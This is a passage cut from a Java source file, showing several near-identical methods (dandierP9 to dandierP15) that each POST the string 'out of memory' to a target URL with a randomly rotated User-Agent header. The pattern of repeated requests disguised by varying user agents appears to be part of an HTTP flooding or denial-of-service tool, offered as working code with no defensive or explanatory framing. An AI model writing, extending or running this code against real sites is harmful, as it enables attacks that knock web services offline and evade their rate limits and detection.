        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
            
     }
        
    private void dandierP9(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierP10(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
               
    }
    
    private void dandierP11(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
               
    }  
    
    private void dandierP12(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
               
    }
    
    private void dandierP13(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
               
    }
    
    private void dandierP14(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
               
    }   
    
    private void dandierP15(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
               
    }               
}